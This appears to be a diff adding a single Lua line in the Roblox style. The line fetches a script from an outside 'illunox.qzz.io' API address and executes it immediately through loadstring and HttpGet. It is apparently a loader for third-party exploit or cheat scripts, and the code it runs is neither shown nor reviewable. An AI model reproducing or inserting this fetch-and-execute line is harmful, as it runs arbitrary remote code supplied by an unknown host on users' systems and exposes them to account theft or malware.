@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://illunox.qzz.io/api/scripts/8d6ec1d6eebc4a668d6553cd7e5c4d3f"))()
